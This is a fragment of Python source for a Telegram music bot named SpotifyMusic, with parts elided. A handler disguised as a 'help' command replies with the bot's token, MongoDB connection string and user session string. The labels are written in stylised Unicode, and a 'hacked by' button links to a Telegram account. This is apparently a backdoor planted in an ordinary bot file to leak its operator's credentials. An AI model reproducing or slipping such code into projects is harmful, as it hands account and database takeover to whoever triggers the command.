...
from SpotifyMusic.utils.database import get_assistant, get_authuser_names, get_cmode
from SpotifyMusic.utils.decorators import ActualAdminCB, AdminActual, language
from SpotifyMusic.utils.formatters import alpha_to_int, get_readable_time
...
async def help(client: Client, message: Message):
   await message.reply_photo(
       ...
       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/iam_Spotify)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/iam_Spotify")
                 ]
            ]
         ),
     )
